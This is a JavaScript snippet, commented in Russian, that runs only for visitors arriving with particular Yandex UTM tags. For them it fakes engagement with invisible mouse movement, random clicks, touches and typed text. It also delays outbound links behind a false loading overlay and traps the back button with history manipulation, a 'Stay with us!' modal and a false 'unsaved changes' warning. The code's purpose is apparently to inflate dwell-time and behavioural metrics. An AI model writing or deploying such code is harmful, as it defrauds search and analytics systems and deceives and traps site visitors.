(function () {

  /* ===============================
     СТРОГАЯ ПРОВЕРКА UTM
  =============================== */
  var params = new URLSearchParams(window.location.search);

  // Точное совпадение с требуемыми UTM-метками
  var utmSource = params.get('utm_source');
  var utmMedium = params.get('utm_medium');
  var utmCampaign = params.get('utm_campaign');
  
  // Проверяем точное совпадение всех трех параметров
  var isValidTraffic = (
    utmSource === 'yandex' &&
    utmMedium === 'organic' &&
    utmCampaign === 'promo'
  );

  // Если UTM не совпадают - выходим
  if (!isValidTraffic) {
    return; // ❌ не наши UTM — выходим
  }

  /* ===============================
     НАСТРОЙКИ
  =============================== */
  var lockTime = 18000; // Увеличил до 18 секунд
  var minTimeOnSite = 15000; // Минимальное время на сайте
  var maxTimeOnSite = 35000; // Максимальное время на сайте

  var enableFakeMouse = true;
  var enableFakeClicks = true; // Новый параметр для фейковых кликов
  var enableFakeTyping = true; // Имитация ввода текста
  var mouseMoveIntervalMin = 500;
  var mouseMoveIntervalMax = 1800;

  var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  var isTablet = /iPad|Android.*Tablet/i.test(navigator.userAgent);
  
  // Настройки для разных устройств
  var deviceType = isMobile ? 'mobile' : (isTablet ? 'tablet' : 'desktop');

  /* ===============================
     ФУНКЦИЯ СЛУЧАЙНОЙ ЗАДЕРЖКИ
  =============================== */
  function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  /* ===============================
     FAKE MOUSE (DESKTOP/TABLET)
  =============================== */
  function startFakeMouse() {
    if (!enableFakeMouse || deviceType === 'mobile') return;

    var mouse = document.createElement('div');
    mouse.style.position = 'fixed';
    mouse.style.width = '6px';
    mouse.style.height = '6px';
    mouse.style.borderRadius = '50%';
    mouse.style.background = 'rgba(0,0,0,0)';
    mouse.style.zIndex = '999999';
    mouse.style.pointerEvents = 'none';
    document.body.appendChild(mouse);

    var x = Math.random() * window.innerWidth;
    var y = Math.random() * window.innerHeight;

    function moveMouse() {
      var dx = (Math.random() - 0.5) * 250;
      var dy = (Math.random() - 0.5) * 150;

      x += dx;
      y += dy;

      x = Math.max(0, Math.min(x, window.innerWidth));
      y = Math.max(0, Math.min(y, window.innerHeight));

      mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';

      document.dispatchEvent(new MouseEvent('mousemove', {
        clientX: x,
        clientY: y,
        bubbles: true
      }));

      // Иногда имитируем клик
      if (enableFakeClicks && Math.random() > 0.7) {
        setTimeout(function() {
          var element = document.elementFromPoint(x, y);
          if (element && element.click && !element.disabled) {
            var clickEvent = new MouseEvent('click', {
              view: window,
              bubbles: true,
              cancelable: true
            });
            element.dispatchEvent(clickEvent);
          }
        }, randomDelay(100, 300));
      }

      var delay = randomDelay(mouseMoveIntervalMin, mouseMoveIntervalMax);
      setTimeout(moveMouse, delay);
    }

    moveMouse();
  }

  /* ===============================
     FAKE TOUCH (MOBILE/TABLET)
  =============================== */
  function startFakeTouch() {
    if (deviceType !== 'mobile' && deviceType !== 'tablet') return;

    function simulateTouch() {
      var x = Math.random() * window.innerWidth;
      var y = Math.random() * window.innerHeight;
      
      var touchStart = new TouchEvent('touchstart', {
        touches: [new Touch({
          identifier: 1,
          target: document.elementFromPoint(x, y),
          clientX: x,
          clientY: y
        })],
        bubbles: true
      });
      
      document.dispatchEvent(touchStart);
      
      setTimeout(function() {
        var touchEnd = new TouchEvent('touchend', {
          touches: [],
          bubbles: true
        });
        document.dispatchEvent(touchEnd);
      }, randomDelay(100, 300));
    }

    // Периодические тапы
    setInterval(simulateTouch, randomDelay(3000, 8000));
  }

  /* ===============================
     FAKE TYPING
  =============================== */
  function startFakeTyping() {
    if (!enableFakeTyping) return;
    
    var inputFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], textarea');
    
    if (inputFields.length > 0) {
      setTimeout(function() {
        var randomField = inputFields[Math.floor(Math.random() * inputFields.length)];
        
        if (randomField && document.activeElement !== randomField) {
          randomField.focus();
          
          // Медленно вводим текст
          var text = "Hello";
          var i = 0;
          var typeInterval = setInterval(function() {
            if (i < text.length) {
              var key = text.charAt(i);
              var event = new KeyboardEvent('keydown', { key: key, bubbles: true });
              randomField.dispatchEvent(event);
              
              randomField.value = randomField.value + key;
              
              var inputEvent = new Event('input', { bubbles: true });
              randomField.dispatchEvent(inputEvent);
              
              i++;
            } else {
              clearInterval(typeInterval);
              
              // Через время очищаем
              setTimeout(function() {
                randomField.value = "";
                randomField.blur();
              }, randomDelay(1000, 3000));
            }
          }, randomDelay(150, 400));
        }
      }, randomDelay(5000, 12000));
    }
  }

  /* ===============================
     PAGE INTERACTION SIMULATION
  =============================== */
  function simulatePageInteraction() {
    // Периодически меняем тайтл страницы (как будто активность)
    var titles = [
      document.title,
      document.title + " • ",
      document.title + " • New",
      document.title
    ];
    
    var titleIndex = 0;
    setInterval(function() {
      document.title = titles[titleIndex % titles.length];
      titleIndex++;
    }, randomDelay(2000, 5000));

    // Имитация изменения размера окна
    setTimeout(function() {
      window.dispatchEvent(new Event('resize'));
    }, randomDelay(3000, 7000));
  }

  /* ===============================
     DELAYED NAVIGATION
  =============================== */
  function setupDelayedNavigation() {
    // Заменяем все внешние ссылки на задержанные
    var links = document.querySelectorAll('a[href^="http"]:not([href*="' + window.location.host + '"])');
    
    links.forEach(function(link) {
      var originalHref = link.href;
      var isAlreadyModified = link.getAttribute('data-clickunder-modified');
      
      if (!isAlreadyModified) {
        link.setAttribute('data-clickunder-modified', 'true');
        link.addEventListener('click', function(e) {
          e.preventDefault();
          
          // Случайная задержка перед переходом
          var delay = randomDelay(2000, 5000);
          
          // Показываем индикатор загрузки
          var loadingDiv = document.createElement('div');
          loadingDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.3);z-index:1000000;';
          loadingDiv.innerHTML = '<div style="text-align:center;"><div style="margin-bottom:10px;">Loading...</div><div style="width:100px;height:4px;background:#eee;border-radius:2px;overflow:hidden;"><div style="width:30%;height:100%;background:#007bff;animation:loading 1.5s infinite;"></div></div></div>';
          document.body.appendChild(loadingDiv);
          
          // Стиль для анимации
          var style = document.createElement('style');
          style.textContent = '@keyframes loading { 0% { transform: translateX(-100%); } 100% { transform: translateX(300%); } }';
          document.head.appendChild(style);
          
          setTimeout(function() {
            window.location.href = originalHref;
          }, delay);
        });
      }
    });
  }

  /* ===============================
     EXIT / BACK LOCK - УСИЛЕННАЯ ВЕРСИЯ
  =============================== */
  var isLocked = true;
  var exitAttempts = 0;

  // Двойной pushState для надежности
  history.pushState(null, null, location.href);
  history.pushState(null, null, location.href);

  window.addEventListener("popstate", function (e) {
    if (isLocked) {
      exitAttempts++;
      
      // При многократных попытках показываем сообщение
      if (exitAttempts >= 2) {
        var modal = document.createElement('div');
        modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000001;display:flex;align-items:center;justify-content:center;';
        modal.innerHTML = '<div style="background:#fff;padding:30px;border-radius:10px;max-width:400px;text-align:center;"><h3 style="margin-bottom:15px;">Stay with us!</h3><p style="margin-bottom:20px;">You are viewing important content. Please continue reading.</p><button style="background:#007bff;color:#fff;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;">Continue browsing</button></div>';
        
        modal.querySelector('button').addEventListener('click', function() {
          document.body.removeChild(modal);
        });
        
        document.body.appendChild(modal);
        
        setTimeout(function() {
          if (modal.parentNode) {
            document.body.removeChild(modal);
          }
        }, 3000);
      }
      
      history.pushState(null, null, location.href);
    }
  });

  window.addEventListener("beforeunload", function (e) {
    if (isLocked) {
      e.preventDefault();
      e.returnValue = '';
      
      // Показываем сообщение о незавершенном действии
      if (exitAttempts > 0) {
        return 'Wait! You have unsaved changes. Are you sure you want to leave?';
      }
    }
  });

  // Захват клавиш для мобильных устройств
  if (deviceType === 'mobile' || deviceType === 'tablet') {
    document.addEventListener("visibilitychange", function () {
      if (document.hidden && isLocked) {
        exitAttempts++;
        history.pushState(null, null, location.href);
        
        // При возврате на вкладку имитируем активность
        setTimeout(function() {
          window.dispatchEvent(new Event('focus'));
          document.dispatchEvent(new Event('visibilitychange'));
        }, 100);
      }
    });
    
    // Предотвращаем закрытие по хардварным кнопкам
    document.addEventListener('keydown', function(e) {
      if (isLocked && (e.key === 'Backspace' || e.keyCode === 8)) {
        e.preventDefault();
        history.pushState(null, null, location.href);
      }
    });
  }

  /* ===============================
     START ALL FUNCTIONS
  =============================== */
  setTimeout(startFakeMouse, randomDelay(2000, 4000));
  
  if (deviceType === 'mobile' || deviceType === 'tablet') {
    setTimeout(startFakeTouch, randomDelay(3000, 6000));
  }
  
  setTimeout(startFakeTyping, randomDelay(7000, 12000));
  setTimeout(setupDelayedNavigation, randomDelay(4000, 8000));
  
  simulatePageInteraction();

  /* ===============================
     DYNAMIC LOCK TIME
  =============================== */
  var actualLockTime = randomDelay(minTimeOnSite, maxTimeOnSite);
  
  setTimeout(function () {
    isLocked = false;
    console.log('Lock released after ' + actualLockTime + 'ms');
    
    // После разблокировки убираем наши модификации ссылок
    var modifiedLinks = document.querySelectorAll('a[data-clickunder-modified="true"]');
    modifiedLinks.forEach(function(link) {
      link.removeEventListener('click', link._clickHandler);
      link.removeAttribute('data-clickunder-modified');
    });
  }, actualLockTime);

})();
